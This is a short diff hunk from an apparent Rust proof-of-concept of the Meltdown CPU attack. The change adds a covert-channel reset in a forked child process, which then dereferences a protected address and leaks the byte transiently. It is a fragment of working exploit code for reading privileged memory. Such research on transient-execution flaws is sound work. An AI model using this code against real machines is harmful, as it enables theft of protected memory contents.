@@ -14,6 +14,8 @@ impl Meltdown for MeltdownUS {
     fn read(&self, addr: *const u8) -> Option<u8> {
         match unsafe { fork() } {
             Ok(ForkResult::Child) => {
+                self.channel.reset();
+
                 let secret = unsafe { *addr }; // Will raise segfault
                 self.channel.leak(secret); // Executed transiently
                 std::process::exit(0);
